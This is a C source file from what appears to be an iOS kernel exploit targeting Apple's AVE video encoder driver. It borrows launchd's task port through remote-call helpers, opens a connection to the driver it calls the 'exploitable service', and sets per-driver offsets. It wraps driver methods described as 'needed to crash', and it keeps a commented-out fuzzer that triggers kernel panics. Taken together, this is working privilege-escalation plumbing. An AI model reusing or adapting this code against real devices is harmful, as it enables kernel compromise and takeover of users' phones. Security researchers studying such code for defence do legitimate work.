#include "apple_ave_utils.h"
#include "ziva_iokit.h"
#include "iosurface_utils.h"

#include "Utilities.h"
// TODO: Change me
#include "remote_call.h"
#include "remote_ports.h"
#include "task_ports.h"

#include "IOReturn.h"
/*
 * Function name: 	apple_ave_utils_get_connection
 * Description:		Establishes a new connection to an AppleAVE2DriverUserClient object.
 * Returns:			kern_return_t and the connection as an output parameter.
 */

kern_return_t apple_ave_utils_get_connection(io_connect_t * conn_out) {
	kern_return_t ret = KERN_SUCCESS;
	io_connect_t connection = 0;
	mach_port_t master_port = 0;
	io_iterator_t itr = 0;
	io_service_t service = 0;
	io_name_t service_name;
    
    ret = host_get_io_master(mach_host_self(), &master_port);
    if (KERN_SUCCESS != ret)
    {
        printf("[ERROR]: Failed getting master port");
        return KERN_ABORTED;
    }
    
    task_t launchd_task = get_launchd_task();
    mach_port_name_t self_port_name = get_self_port_name();
    
	ret = IOServiceGetMatchingServices(master_port, IOServiceMatching(IOKIT_ALL_SERVICES), &itr);
	if (KERN_SUCCESS != ret) {
		printf("[ERROR]: Failed getting matching services\n");
        return KERN_ABORTED;
	}

	while(IOIteratorIsValid(itr) && (service = IOIteratorNext(itr))) {
        
		ret = IORegistryEntryGetName(service, service_name);
        
        // Uncomment to list all the services/drivers
        //printf("[INFO]: Service: %s\n", service_name);
        
        if (KERN_SUCCESS != ret) {
            printf("[ERROR]: Error retrieving name\n");
            continue;
        }
        
        // Name differs, and so we check
		if (strstr(service_name, "AppleAVE2Driver") || strstr(service_name, "AppleVXE380Driver")|| strstr(service_name, "AppleAVEDriver")) {
            printf("[INFO]: Found matching exploitable service: %s\n", service_name);
            set_driver_offsets(service_name);
        } else {
            continue;
        }
        
        // Use the port from triple_fetch
        mach_port_name_t remote_service = push_local_port(launchd_task, service, MACH_MSG_TYPE_COPY_SEND);
        if(remote_service == MACH_PORT_NULL) {
            printf("[ERROR]: pushing local port to the task\n");
            return KERN_ABORTED;
        }
        
        mach_port_name_t remote_client = MACH_PORT_NULL;
        ret = (int) call_remote(launchd_task, IOServiceOpen, 4, REMOTE_LITERAL(remote_service), REMOTE_LITERAL(self_port_name), REMOTE_LITERAL(0), REMOTE_OUT_BUFFER(&remote_client, sizeof(remote_client)));
        if(ret != 0) {
            printf("[ERROR]: Could not remote call IOServiceOpen..\n");
            return KERN_ABORTED;
        }
        
        connection = pull_remote_port(launchd_task, remote_client, MACH_MSG_TYPE_COPY_SEND);
        break; // Stop at this point
    }

    if (0 == connection) {
        printf("[ERROR]: Service not found (is your driver supported?)\n");
    } else {
        printf("[INFO]: Connection with service %s was successfully made.\n", service_name);
        *conn_out = connection;
        IOObjectRelease(itr);
        itr = 0;
    }
    
    return connection == 0 ? KERN_ABORTED : KERN_SUCCESS;
}



/*
 * Function name: 	apple_ave_utils_add_client
 * Description:		Adds a client to something. Needed to crash.
 * Returns:			kern_return_t from the IOKit call.
 */

kern_return_t apple_ave_utils_add_client(io_connect_t conn) {
	kern_return_t ret = KERN_SUCCESS;
	char input_buffer[IOKIT_ADD_CLIENT_INPUT_BUFFER_SIZE] = {0};
	size_t output_buffer_size = IOKIT_ADD_CLIENT_OUTPUT_BUFFER_SIZE;
	char output_buffer[output_buffer_size];

	memset(output_buffer, 0, output_buffer_size);

	ret = IOConnectCallMethod(conn,
		APPLEAVE2_EXTERNAL_METHOD_ADD_CLIENT,
		NULL, 0,
		input_buffer, sizeof(input_buffer),
		NULL, 0,
		output_buffer, &output_buffer_size);

	return ret;
}


/*
 * Function name: 	apple_ave_utils_remove_client
 * Description:		Removes a client... from being added to something.
 * Returns:			kern_return_t from the IOKit call.
 */

kern_return_t apple_ave_utils_remove_client(io_connect_t conn) {
	kern_return_t ret = KERN_SUCCESS;
	char input_buffer[IOKIT_REMOVE_CLIENT_INPUT_BUFFER_SIZE] = {0};
	size_t output_buffer_size = IOKIT_REMOVE_CLIENT_OUTPUT_BUFFER_SIZE;
	char output_buffer[output_buffer_size];

	memset(output_buffer, 0, output_buffer_size);

	ret = IOConnectCallMethod(conn,
		APPLEAVE2_EXTERNAL_METHOD_REMOVE_CLIENT,
		NULL, 0,
		input_buffer, sizeof(input_buffer),
		NULL, 0,
		output_buffer, &output_buffer_size);

	return ret;
}


/*
 * Function name: 	apple_ave_utils_encode_frame
 * Description:		Wrapper for the EncodeFrame external method.
 * Returns:			kern_return_t.
 */

kern_return_t apple_ave_utils_encode_frame(io_connect_t conn, void * input_buffer,
	void * output_buffer) {
	
	kern_return_t ret = KERN_SUCCESS;	
	size_t output_buffer_size = IOKIT_ENCODE_FRAME_OUTPUT_BUFFER_SIZE;

	ret = IOConnectCallMethod(conn,
		APPLEAVE2_EXTERNAL_METHOD_ENCODE_FRAME,
		NULL, 0,
		input_buffer, IOKIT_ENCODE_FRAME_INPUT_BUFFER_SIZE,
		NULL, 0,
		output_buffer, &output_buffer_size);

	return ret;
}

// Don't use this unless you want kernel panics
void fuzz_encode_frames(io_connect_t conn, uint32_t bad_surface, uint32_t surface_id) {
//
//    for(uint64_t i = 59; i <= 75; i++) {
//
//        char cinput_buffer[0x650];
//        char coutput_buffer[0x130];
//        size_t coutput_buffer_size = sizeof(coutput_buffer);
//
//        bzero(cinput_buffer, sizeof(cinput_buffer));
//        bzero(coutput_buffer, sizeof(coutput_buffer));
//
//        printf("[TRYING]: 0x%llx\n", 0x1a4c9 + i);
//
//
//        for(uint64_t j = 0; j <= sizeof(cinput_buffer); j++) {
//            cinput_buffer[j] = 0x1a4c9 + i;
//        }
//
//
//
//        cinput_buffer[0xd8] = 0x1a4c9 + 59;
//        cinput_buffer[0xe8] = 0x1a4c9 + 59;
//        cinput_buffer[0xC] = 8;
//
//
//        cinput_buffer[0x15] = 0x1a4c9 + 59; // AVEUC ERROR: in->codedOutputBuffer[0] NULL.
//        cinput_buffer[0x16] = 0x1a4c9 + 59;
//        cinput_buffer[0x17] = 0x1a4c9 + 59; // H264VIDEOENCODER_MAX_NUMER_OF TOTAL_MACROBLOCKS_H6
//        cinput_buffer[0x18] = 0x1a4c9 + 59;
//        cinput_buffer[0x19] = 0x1a4c9 + 59;
//        cinput_buffer[0x1A] = 0x1a4c9 + 59;
//        cinput_buffer[0x1B] = 0x1a4c9 + 59;
//        cinput_buffer[0x1C] = bad_surface;
//        cinput_buffer[0x1D] = 0x1a4c9 + 59;
//        cinput_buffer[0x84] = 0;
//        *(unsigned int*)(cinput_buffer + 0x1C) = 0;
//        *(unsigned int*)(cinput_buffer + 0x84) = 0;
//        //        cinput_buffer[0x4] = bad_surface;
//        //        cinput_buffer[0x8] = bad_surface;
//        //        cinput_buffer[0xE8] = bad_surface;
//        //        cinput_buffer[0xEC] = bad_surface;
//
//
//
//        //        cinput_buffer[0x14] = 0x10007ef;
//
//
//        //        for(uint64_t j = 0; j <= 0x10007ef; j++) {
//        //
//        //            printf("[INFO]: 0x%llx\n", j);
//        //
//        //            cinput_buffer[0x15] = j;
//        ret = IOConnectCallMethod(conn,
//                                  APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
//                                  NULL, 0, cinput_buffer,
//                                  0x650,
//                                  NULL, 0,
//                                  coutput_buffer, &coutput_buffer_size);
//
//        if(ret == KERN_SUCCESS) {
//            printf("[INFO]: success with cinput_buffer[j]\n");
//            break;
//        }
//
//        //        }
//
//        if(ret == KERN_SUCCESS) {
//            printf("[INFO]: success with cinput_buffer[j]\n");
//            break;
//        }
//    }
    
}

/*
 * Function name: 	apple_ave_utils_prepare_to_encode_frames
 * Description:		Wrapper for the PrepareToEncodeFrames external method.
 * Returns:			kern_return_t and output buffer as an output parameter.
 */

kern_return_t apple_ave_utils_prepare_to_encode_frames(io_connect_t conn, void * input_buffer, void * output_buffer) {
	
	kern_return_t ret = KERN_ABORTED;
	size_t output_buffer_size = OFFSET(encode_frame_output_buffer_size);
    
    printf("[INFO]: apple_ave_utils_prepare_to_encode_frames preparing to encode frames for connection\n");
    
    ret = IOConnectCallMethod(conn,
        APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
        NULL, 0, input_buffer,
        OFFSET(encode_frame_input_buffer_size),
        NULL, 0,
        output_buffer, &output_buffer_size);
    
    if(ret != KERN_SUCCESS) {
        printf("[ERROR]: Prepare to encode frame (error code: %X)\n", ret);
        return KERN_ABORTED;
    }

	return ret;	
}

/*
 * Function name: 	apple_ave_utils_set_session_settings
 * Description:		Sets the session settings for the AVE client.
 * Returns:			kern_return_t.
 */

kern_return_t apple_ave_utils_set_session_settings(io_connect_t conn, void * input_buffer, void * output_buffer) {
	
	kern_return_t ret = KERN_SUCCESS;
    char output_buffer_local[OFFSET(encode_frame_output_buffer_size)];

    bzero(input_buffer, sizeof(input_buffer));

	size_t output_buffer_size = sizeof(output_buffer_local);


	ret = IOConnectCallMethod(conn,
		APPLEAVE2_EXTERNAL_METHOD_SET_SESSION_SETTINGS,
		NULL, 0,
		input_buffer, OFFSET(encode_frame_input_buffer_size),
		NULL, 0,
		output_buffer_local, &output_buffer_size);

	if (output_buffer && KERN_SUCCESS == ret)
	{
		memcpy(output_buffer, output_buffer_local, sizeof(output_buffer_local));
	}

	return ret;
}

